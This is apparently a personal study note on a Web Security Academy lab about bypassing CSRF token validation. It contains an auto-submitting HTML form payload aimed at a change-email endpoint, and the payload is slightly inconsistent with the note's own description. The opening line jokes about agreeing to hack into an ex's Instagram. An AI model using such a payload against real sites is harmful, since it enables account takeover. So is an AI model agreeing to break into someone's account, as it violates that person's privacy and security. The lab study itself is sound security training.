# NOTES
Someone asked me to hack into their ex's Instagram. I told them sure thing I could use an X-Site-Request-Forgery. 

## LEARNINGS 
- CSRF Token Bypass 2 : To bypass the validation, simply get RID of the CSRF token... DUH 

### EXPLOIT 
- This challenge had CSRF token validation on the email change action 
![[Pasted image 20220126055135.png]]
- Simply Sent a packet without CSRF Token and it changed the God Damn email on the website
![[Pasted image 20220126055344.png]]
- Taking the above into consideration, crafted a payload that just just CSRF tokens and does WHAT it WANTS #THANOS_INEVITABLE

		404 : Not Found 
		 <html>
		  <body>
		    <form action="https://ac581f3f1e48dba8c09178fb00c9002d.web-security-academy.net/my-account/change-email" method="POST">
		      <input type="hidden" name="csrf" value="3JX7u51QbzD66oQYbMpw9hLCxGM4q7Ee" />
		    </form>
		    <script>
		      document.forms[0].submit();
		    </script>
		  </body>
		</html> 